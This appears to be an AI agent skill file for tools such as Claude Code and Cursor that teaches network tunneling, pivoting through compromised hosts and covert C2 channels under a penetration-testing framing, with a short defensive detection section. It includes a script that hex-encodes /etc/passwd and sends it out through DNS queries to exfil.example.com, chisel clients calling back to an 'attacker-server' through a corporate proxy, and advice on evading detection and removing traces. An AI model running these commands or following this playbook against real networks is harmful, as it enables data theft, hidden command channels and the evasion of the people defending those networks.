---
name: network-tunneling-proxy
description: "Network tunneling encapsulates one protocol inside another to bypass firewalls, evade detection, and route traffic through restricted networks."
origin: openclaw
version: "0.1.19"
compatibility:
  - openclaw
  - claude-code
  - cursor
  - windsurf
allowed-tools:
  - Bash
  - Read
  - Write
  - Edit
  - WebSearch
  - WebFetch
metadata:
  domain: network-attack
  tool_count: 0
  guide_count: 8
  mitre: "TA0008-Lateral Movement"
---

# Network Tunneling & Proxy

> **Supplementary Files**:
> - `payloads.md` -- Tunneling and proxy payloads: HTTP/SOCKS tunnels, SSH pivoting, DNS/ICMP covert channels, TLS wrapping, proxy chaining, multi-hop pivot construction
> - `test-cases.md` -- Structured test cases covering SOCKS proxy setup, HTTP tunnels, DNS tunnels, SSH pivoting, proxy chains, ICMP tunnels, and TLS wrapping
> - `guides/ssh-http-tunneling-pivoting.md` -- Deep dive into SSH and HTTP tunneling with pivoting techniques
> - `guides/dns-icmp-covert-tunnel.md` -- DNS and ICMP covert channel construction and detection
> - `guides/socks-proxy-chain-traffic.md` -- SOCKS proxy chaining, TLS wrapping, and traffic masking
> - `guides/pivoting-double-pivot-guide.md` -- Double pivoting, multi-hop tunneling, chisel + ligolo-ng chaining, SOCKS cascade
> - `guides/ipv6-tunneling-guide.md` -- IPv6 tunneling attacks, 6in4/6to4/Teredo tunnels, IPv6 reconnaissance, firewall bypass
> - `guides/tunnel-detection-evasion-guide.md` -- Tunnel detection (DPI, heuristics), evasion techniques (fragmentation, encryption mimicry, timing manipulation)

## Summary

Network Tunneling Proxy skill domain covering network attack operations.

**Domain**: network-attack

**MITRE ATT&CK**: TA0008-Lateral Movement

## Description

Network tunneling encapsulates one protocol inside another to bypass firewalls, evade detection, and route traffic through restricted networks. Proxying intermediates network connections to mask origins, chain through multiple hosts, and distribute traffic across disparate exit points. Together, these techniques enable penetration testers to reach isolated network segments, maintain persistent covert channels, and simulate advanced adversary lateral movement.

**Core Insight**: Most enterprise networks restrict inbound connections but allow outbound traffic on specific protocols (HTTP/HTTPS, DNS, ICMP). Tunneling exploits these asymmetric rules by encapsulating arbitrary traffic inside permitted protocols. Defense teams that only monitor Layer 7 HTTP content will miss tunnels operating at Layer 3-4 via DNS queries, ICMP packets, or raw TCP relays.

**Key Tunnel Types**:

- **HTTP/SOCKS Tunnels**: chisel, gost, 3proxy encapsulate traffic in HTTP or SOCKS protocol, blending with normal web traffic
- **SSH Tunneling**: sshuttle provides VPN-like transparent access; SSH port forwarding for targeted relay
- **DNS Tunneling**: dnscat2 creates bidirectional C2 channels over DNS queries -- see `dns-attacks` skill for dns2tcp and iodine variants
- **ICMP Tunneling**: ptunnel encapsulates TCP inside ICMP echo packets, exploiting permissive ping rules
- **TLS Wrapping**: stunnel adds TLS encryption to any TCP connection, hiding protocol fingerprints
- **Pivoting**: ligolo-ng enables multi-hop relay chains through compromised hosts for deep network traversal

**Cross-References**:
- `dns-attacks` -- dns2tcp, iodine, dnscat2 for DNS protocol attacks and exfiltration; this skill focuses on the tunneling/proxying use case
- `post-exploitation` -- chisel and ligolo-ng for pivoting during lateral movement; this skill provides the full tunneling toolkit context
- `network-pentest` -- general network reconnaissance and attack; tunneling extends reach into discovered segments

---

## Use Cases

1. **Bypassing egress firewall restrictions** -- Encapsulate traffic in permitted outbound protocols (DNS, ICMP, HTTPS) to reach external C2 infrastructure from restricted networks
2. **Pivoting through compromised hosts** -- Chain SOCKS proxies and tunnels through multiple pivot points to reach isolated internal network segments (e.g., DMZ to production to database tier)
3. **Maintaining covert C2 channels** -- Establish DNS or ICMP-based tunnels that evade HTTP content inspection and standard proxy logging
4. **Transparent network access via VPN-like tunnels** -- Use sshuttle or chisel SOCKS tunnels to route entire subnet traffic through a single compromised host without per-service configuration
5. **Traffic masking and obfuscation** -- Wrap tunnels in TLS with stunnel, chain through multiple proxy types, and distribute traffic to defeat traffic analysis and attribution
6. **Red team infrastructure relay** -- Build multi-hop tunnel chains from target network back through redirectors to operator workstations, mimicking advanced adversary infrastructure

---

## Core Tools

| Tool | Category | Purpose | Key Command |
|------|----------|---------|-------------|
| chisel | HTTP/SOCKS Tunnel | TCP/UDP tunnel over HTTP with SOCKS5 support, NAT traversal | `chisel server -p 8080 --reverse` |
| ligolo-ng | Pivoting | Transparent proxy with TUN interface for multi-hop pivoting | `./proxy -selfcert` |
| proxychains | Proxy Chaining | Route any application traffic through SOCKS/HTTP proxy chains | `proxychains4 nmap -sT target` |
| socat | Relay/Tunnel | Bidirectional byte stream relay between any two endpoints | `socat TCP-LISTEN:8080,fork TCP:target:80` |
| ptunnel | ICMP Tunnel | Reliable TCP tunnel over ICMP echo packets | `sudo ptunnel` |
| gost | Multi-protocol Tunnel | Tunnel over HTTP/HTTPS/SOCKS5/Shadowsocks/QUIC with chaining | `gost -L :8080 -F socks5://proxy:1080` |
| 3proxy | Proxy Server | Lightweight HTTP/SOCKS proxy with chaining and ACL support | `3proxy /etc/3proxy/3proxy.cfg` |
| sshuttle | SSH VPN | Transparent VPN-like network access over SSH without root on remote | `sshuttle -r user@host 10.0.0.0/8` |
| stunnel | TLS Wrapping | Add TLS encryption to any TCP service, hiding protocol fingerprints | `stunnel /etc/stunnel/stunnel.conf` |
| dnscat2 | DNS C2 Tunnel | Encrypted C2 channel over DNS with file transfer and shell | `ruby ./dnscat2.rb domain.com` |

---

## Methodology

### Phase 1: Network Topology Assessment

Before tunneling, map the network restrictions:

```
1. Identify allowed outbound protocols (nmap, curl, nslookup tests)
2. Determine firewall rules (inbound/outbound filtering)
3. Locate proxy infrastructure (corporate proxies, web gateways)
4. Assess DNS resolution policy (external resolvers allowed?)
5. Check ICMP egress (ping external hosts)
6. Map internal network segments reachable from current position
```

### Phase 2: Tunnel Type Selection

Select tunnel type based on network restrictions:

| Network Restriction | Recommended Tunnel | Fallback |
|---------------------|-------------------|----------|
| Outbound HTTP/HTTPS allowed | chisel (HTTP tunnel) | gost |
| Outbound DNS allowed | dnscat2 | iodine (see dns-attacks) |
| Outbound ICMP allowed | ptunnel | ICMP shell |
| SSH access to pivot host | sshuttle | SSH port forwarding |
| No outbound, but have pivot | ligolo-ng (reverse) | chisel --reverse |
| Need to mask protocol | stunnel + any tunnel | gost with TLS |
| Deep inspection in place | DNS tunnel + stunnel | Multi-hop chain |

### Phase 3: Tunnel Construction

Build tunnels in order of stealth:

1. **SSH-based** (sshuttle, port forward) -- legitimate traffic pattern, but requires SSH access
2. **HTTP/SOCKS** (chisel, gost, 3proxy) -- blends with web traffic, survives most proxies
3. **TLS-wrapped** (stunnel) -- encrypted outer layer defeats DPI
4. **DNS** (dnscat2) -- last resort when only DNS is allowed, high latency
5. **ICMP** (ptunnel) -- when only ping is allowed, very slow but functional

### Phase 4: Pivoting Chain Construction

For deep network traversal:

```
Operator -> [stunnel TLS] -> [proxy1: SOCKS5] -> [chisel HTTP] -> [pivot1] -> [ligolo-ng TUN] -> [pivot2] -> Target Network
```

Chain multiple tunnel types to maximize stealth:

- Outer layer: stunnel TLS wrapping (hide protocol fingerprints)
- Middle layer: chisel or gost HTTP tunnel (blend with web traffic)
- Inner layer: SOCKS proxy via proxychains (route arbitrary applications)
- Final hop: ligolo-ng TUN interface (transparent Layer 3 access)

### Phase 5: Traffic Verification

Confirm tunnel functionality and stealth:

```
1. Verify connectivity through tunnel (curl, nmap through proxychains)
2. Check tunnel throughput (iperf3 through tunnel)
3. Verify tunnel persistence (reconnection on failure)
4. Monitor for detection signs (IDS alerts, firewall logs)
5. Document tunnel chain for engagement reporting
```

---

## Defense Perspective

**Detection Strategies**:

- **DNS tunnel detection**: Monitor for abnormally long subdomain labels (>60 chars), high query frequency, unusual query types (TXT, NULL), and consistent query patterns from single hosts
- **ICMP tunnel detection**: Flag ICMP packets with unusually large payloads, non-standard payload content, or consistent ICMP traffic to a single destination
- **HTTP tunnel detection**: Look for unusual HTTP headers, binary data in HTTP bodies, long-lived connections with high throughput, and connections to unusual ports serving HTTP
- **SOCKS proxy detection**: Monitor for SOCKS handshake patterns (0x05 byte), unexpected outbound connection patterns from single hosts
- **TLS anomaly detection**: Identify TLS connections to uncommon ports, self-signed certificates, and certificate mismatches between SNI and presented cert

**Prevention Controls**:

- Implement strict egress filtering with allow-lists for outbound protocols and destinations
- Deploy DNS inspection and filtering (block TXT/NULL queries, limit query length)
- Rate-limit ICMP traffic and block large ICMP payloads
- Use deep packet inspection (DPI) for HTTP/HTTPS traffic
- Monitor for TUN/TAP interface creation on endpoints
- Deploy network behavior analysis (NBA) tools for anomalous traffic patterns

**Logging and Monitoring**:

- Log all DNS queries with full query string for retrospective tunnel detection
- Monitor outbound connection volume and duration per host
- Alert on sudden increases in DNS or ICMP traffic from individual hosts
- Track proxy and tunnel process creation on endpoints (OS-level monitoring)
- Correlate network flow data with endpoint process information

---

## Practical Steps

1. **Assess network egress** — From the current network position, identify which outbound protocols are permitted. Test HTTP/HTTPS (curl to external server), DNS (nslookup external domain), ICMP (ping external host), and arbitrary TCP ports (nc -zv). Record all allowed protocols for tunnel type selection.
2. **Select tunnel type** — Based on egress assessment, choose the most stealthy tunnel that will work: SSH tunnel if SSH access exists, HTTP/SOCKS tunnel if outbound web traffic is allowed, DNS tunnel if only DNS resolves, ICMP tunnel if only ping works. Prefer tunnels that blend with existing traffic patterns.
3. **Deploy tunnel server** — On the attacker-controlled infrastructure (VPS or local listener), start the appropriate tunnel server: chisel server, dnscat2 server, ptunnel relay, or stunnel TLS endpoint. Configure authentication and logging.
4. **Deploy tunnel client** — On the compromised pivot host, deploy and execute the tunnel client connecting back to the server. For chisel, use `chisel client http://server:port R:socks`. For dnscat2, execute `./dnscat --secret KEY domain.com`. Verify the connection establishes in the server logs.
5. **Configure proxy routing** — Set up proxychains or application-level proxy configuration to route tools through the newly created tunnel. Create `/etc/proxychains4.conf` with the SOCKS port from the tunnel client. Test with `proxychains4 curl http://internal-target`.
6. **Build pivot chain** — For deep network traversal requiring multiple hops, chain tunnels: establish first tunnel to DMZ host, deploy and connect second tunnel through the first, route target subnet through the final tunnel interface. Document each hop with IP, port, tunnel type, and credentials.
7. **Wrap in TLS for stealth** — If deep packet inspection is detected, wrap the tunnel connection in stunnel TLS. Configure stunnel server on the tunnel endpoint and stunnel client on the pivot host. This hides the tunnel protocol inside standard HTTPS traffic.
8. **Verify tunnel functionality** — Test connectivity through the tunnel with multiple tools (nmap, curl, ssh). Measure throughput with iperf3. Check for DNS leaks by monitoring DNS queries. Verify the tunnel survives idle periods and reconnects automatically.
9. **Monitor for detection** — Watch for indicators that the tunnel has been detected: IDS alerts, firewall blocks, unusual process termination on the pivot host. Have fallback tunnel types ready to switch to if the primary tunnel is blocked.
10. **Document and plan cleanup** — Record the complete tunnel chain configuration for engagement reporting. Prepare cleanup commands for each tunnel component (kill processes, remove TUN interfaces, delete configuration files). Execute cleanup during the engagement closeout phase.

## Tunneling Protocol Comparison

Selecting the right tunneling protocol depends on the network restrictions, required throughput, stealth requirements, and available infrastructure. This comparison covers the primary tunneling protocols available in Kali Linux.

| Protocol | Speed | Stealth | Setup Complexity | Detection Risk | Best For |
|----------|-------|---------|------------------|----------------|----------|
| SSH tunnel | High | Medium | Low | Low (legitimate traffic) | General pivoting when SSH access exists |
| HTTP/SOCKS (chisel) | High | Medium | Low | Medium (HTTP patterns) | Restricted networks allowing web traffic |
| TLS (stunnel) | High | High | Medium | Low (standard HTTPS) | Wrapping other tunnels for DPI evasion |
| DNS (dnscat2) | Very Low | Medium | High | High (query anomalies) | Last resort when only DNS is allowed |
| ICMP (ptunnel) | Very Low | Medium | Medium | Medium (large payloads) | When only ICMP egress is permitted |
| QUIC (gost) | High | High | Medium | Low (UDP looks like QUIC) | Networks with UDP allowed but TCP restricted |
| WireGuard tunnel | High | High | Low | Low (looks like UDP) | Fast encrypted tunnels between VPS hosts |

**Protocol selection workflow**: Start with SSH or HTTP tunnels (high speed, moderate stealth). If blocked, try DNS tunnels (slow but often permitted). If DNS is also blocked, fall back to ICMP. For maximum stealth, always wrap tunnels in TLS using stunnel. For production red team infrastructure, use WireGuard between redirectors and operator workstations.

## Detection and Defense

Understanding how defenders detect tunneling activity is essential for building stealthier tunnels and providing accurate remediation guidance in penetration test reports.

### Network-Level Detection

```bash
# DNS tunnel detection: monitor for long subdomain labels and high query frequency
tcpdump -i eth0 -nn port 53 -l 2>/dev/null | awk '{print length, $0}' | sort -rn | head

# ICMP tunnel detection: flag ICMP packets with unusually large payloads
tcpdump -i eth0 -nn icmp -vv 2>/dev/null | awk '/length/ && $NF > 100 {print}'

# HTTP tunnel detection: identify long-lived connections with high throughput
ss -tnp | awk '$4 ~ /:443/ || $4 ~ /:8080/' | while read line; do
  conn=$(echo "$line" | awk '{print $4, $5}')
  pid=$(echo "$line" | grep -oP 'pid=\K[0-9]+')
  [ -n "$pid" ] && echo "Long-lived HTTP connection: $conn (PID: $pid, CMD: $(cat /proc/$pid/cmdline 2>/dev/null | tr '\0' ' '))"
done
```

### Defensive Countermeasures

| Detection Method | What It Catches | Bypass Difficulty |
|-----------------|-----------------|-------------------|
| DNS query length analysis | DNS tunnels with long labels | Medium (use shorter labels) |
| DNS query frequency monitoring | High-frequency DNS C2 | Medium (add delays) |
| ICMP payload size inspection | ICMP tunnels (large payloads) | Hard (limited by MTU) |
| TLS certificate monitoring | Self-signed certificates | Easy (use valid certs) |
| TUN/TAP interface monitoring | sshuttle, ligolo-ng, VPN tunnels | Hard (requires endpoint access) |
| Behavioral traffic analysis | Anomalous connection patterns | Medium (timing obfuscation) |
| SOCKS handshake detection | Unencrypted SOCKS proxies | Easy (wrap in TLS) |

## SOCKS Proxy Chain Construction

Building robust SOCKS proxy chains requires understanding chain topologies, failover strategies, and how different SOCKS versions interact.

### Chain Topology Patterns

```
# Linear chain (most common, simplest)
Operator -> SOCKS5:1080 -> Pivot1 -> SOCKS5:1081 -> Pivot2 -> Target

# Branched chain (access multiple network segments)
Operator -> SOCKS5:1080 -> Pivot1
                              |
                              +-> SOCKS5:1081 -> Internal-Segment-A
                              |
                              +-> SOCKS5:1082 -> Internal-Segment-B

# Redundant chain (failover for resilient operations)
Operator -> Dynamic Chain
             -> SOCKS5:1080 -> Primary-Pivot -> Target
             -> SOCKS5:1081 -> Backup-Pivot  -> Target (failover)
```

### proxychains Advanced Configuration

```bash
# Strict chain with DNS resolution through proxy (prevents DNS leaks)
cat > /etc/proxychains4.conf << 'EOF'
strict_chain
proxy_dns
remote_dns_subnet 224.0.0.0/8
tcp_read_time_out 15000
tcp_connect_time_out 8000
localnet 127.0.0.0/255.0.0.0
[ProxyList]
socks5 127.0.0.1 1080
socks5 10.0.0.5 1080
http 192.168.1.100 8080
EOF

# Random chain with length limit for traffic distribution
cat > /etc/proxychains4-random.conf << 'EOF'
random_chain
chain_len = 2
chain_verbose
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000
[ProxyList]
socks5 proxy1.example.com 1080
socks5 proxy2.example.com 1080
socks5 proxy3.example.com 1080
socks5 proxy4.example.com 1080
EOF
```

## DNS Exfiltration Techniques

DNS exfiltration tunnels data out of a network by encoding it within DNS queries to an attacker-controlled domain. While dnscat2 provides full C2 functionality, simpler exfiltration can be achieved with minimal tooling.

### Encoding Data in DNS Queries

```bash
# Simple DNS exfiltration: encode file content as hex subdomain queries
# On the exfil server (authoritative DNS for exfil.example.com):
# Capture all queries and extract the subdomain data
tcpdump -i any -nn port 53 -l 2>/dev/null | \
  grep "exfil.example.com" | awk '{print $NF}' | sed 's/\.exfil.*//'

# On the source, encode and send data:
data=$(xxd -p /etc/passwd | tr -d '\n')
chunk_size=60  # DNS label max is 63 characters
for i in $(seq 0 $chunk_size ${#data}); do
  chunk=${data:$i:$chunk_size}
  nslookup "${chunk}.exfil.example.com" >/dev/null 2>&1
  sleep 0.5  # Rate limit to avoid detection
done

# More stealthy: use TXT records for bidirectional communication
# Server: resolve TXT queries with data in responses
# Client: encode queries as hex subdomains, receive data in TXT responses
dig +short TXT "command_base64.exfil.example.com"
```

### Detection and Prevention

DNS exfiltration is detectable through: high-frequency queries to a single domain (more than 100 queries per hour to one domain from a single host), unusually long subdomain labels (legitimate domains rarely exceed 20 characters per label), high-entropy subdomain names (base64/hex encoded data has higher entropy than normal words), and TXT/NULL record queries to external resolvers (unusual for normal operations).

## HTTP/HTTPS Tunneling Deep Dive

HTTP/HTTPS tunneling provides the most versatile tunneling option because web traffic is nearly always permitted through corporate firewalls and proxies. This section covers advanced HTTP tunneling techniques beyond basic chisel usage.

### Gost Multi-Protocol Tunneling

```bash
# gost supports chaining multiple protocols in a single connection path
# Client -> HTTP -> TLS -> SOCKS5 -> Target

# Step 1: Start gost with TLS on the relay server
gost -L "tls://:443" -F "socks5://internal-proxy:1080"

# Step 2: Connect from the client through the TLS tunnel
gost -L ":8080" -F "tls://relay-server:443"

# Step 3: Route traffic through local gost listener
proxychains4 curl http://target-internal/

# gost with WebSockets for firewall traversal (looks like legitimate WebSocket traffic)
gost -L "ws://:8080" -F "socks5://backend:1080"
```

### HTTP Tunnel Through Corporate Proxy

When a corporate HTTP proxy intercepts all outbound web traffic, tunnels must be configured to use the proxy as their first hop.

```bash
# Configure chisel to connect through an HTTP proxy
export HTTP_PROXY=http://proxy.corp.local:8080
chisel client http://attacker-server:443 R:socks

# Configure gost with upstream proxy
gost -L ":8080" -F "http://proxy.corp.local:8080" -F "tls://attacker-server:443"

# Use CONNECT method tunneling through corporate proxy
# Many corporate proxies allow CONNECT to port 443
curl -x http://proxy.corp.local:8080 -p -k https://attacker-server:443/tunnel
```

## Pivoting Workflows

### Standard Pivoting Workflow

This workflow covers the typical progression from initial foothold to deep network traversal using tunneling techniques.

```
Phase 1: Foothold Assessment
  -> Identify egress rules from compromised host
  -> Test: HTTP/HTTPS (curl), DNS (nslookup), ICMP (ping), SSH (ssh)

Phase 2: First Tunnel
  -> Select best tunnel type based on allowed protocols
  -> Deploy tunnel client on compromised host
  -> Establish SOCKS proxy on operator workstation

Phase 3: Network Enumeration
  -> Scan reachable hosts through SOCKS proxy
  -> Identify additional pivot points and network segments
  -> Map network topology for multi-hop planning

Phase 4: Multi-Hop Extension
  -> Deploy additional tunnel clients on new pivot points
  -> Chain SOCKS proxies for deep network traversal
  -> Wrap tunnels in TLS for stealth

Phase 5: Targeted Access
  -> Route specific tools to target services
  -> Establish RDP/SSH sessions through tunnel chain
  -> Collect evidence for engagement reporting

Phase 6: Cleanup
  -> Kill tunnel processes on all pivot hosts
  -> Remove TUN/TAP interfaces
  -> Delete tunnel binaries and configuration files
  -> Verify cleanup with process and network state checks
```

### Automation Scripts

```bash
# Automated tunnel health monitoring
cat > tunnel_monitor.sh << 'SCRIPT'
#!/bin/bash
TUNNEL_PID=$(pgrep -f "chisel client")
SOCKS_PORT=1080

if [ -z "$TUNNEL_PID" ]; then
  echo "[$(date)] Tunnel process not found. Restarting..."
  chisel client http://server:8080 R:socks &
fi

if ! curl -s --socks5 localhost:$SOCKS_PORT http://10.0.0.1 >/dev/null 2>&1; then
  echo "[$(date)] SOCKS proxy not responding. Restarting tunnel..."
  kill $TUNNEL_PID 2>/dev/null
  sleep 2
  chisel client http://server:8080 R:socks &
fi
SCRIPT
chmod +x tunnel_monitor.sh

# Run in cron every 5 minutes
# */5 * * * * /path/to/tunnel_monitor.sh >> /var/log/tunnel_monitor.log 2>&1
```

## Common Pitfalls

1. **Tunnel without encryption** -- Unencrypted tunnels (plain HTTP, raw TCP relay) expose data to interception. Always wrap tunnels in TLS using stunnel or SSH.
2. **Single point of failure** -- A tunnel chain with a single pivot point fails if that host goes down. Build redundant paths where possible.
3. **Ignoring MTU and latency** -- DNS and ICMP tunnels have high overhead and low MTU. File transfers and interactive shells will be slow -- plan accordingly.
4. **Tunnel detection via traffic volume** -- Even encrypted tunnels create traffic volume anomalies. Use traffic throttling and scheduling to blend with normal patterns.
5. **Hardcoded tunnel endpoints** -- Embedding server IPs in tunnel configurations creates artifacts. Use domain fronts or dynamic DNS for flexibility.
6. **Neglecting cleanup** -- TUN interfaces, proxy processes, and socat relays leave traces on compromised hosts. Plan cleanup procedures for each tunnel component.
7. **Port collision on pivot hosts** -- Running multiple tunnels on the same pivot host risks port conflicts and resource exhaustion. Monitor pivot host resources.
8. **DNS tunnel without domain control** -- dnscat2 and iodine require authoritative DNS delegation for a domain. Attempting DNS tunneling without this setup will fail at the nameserver level.
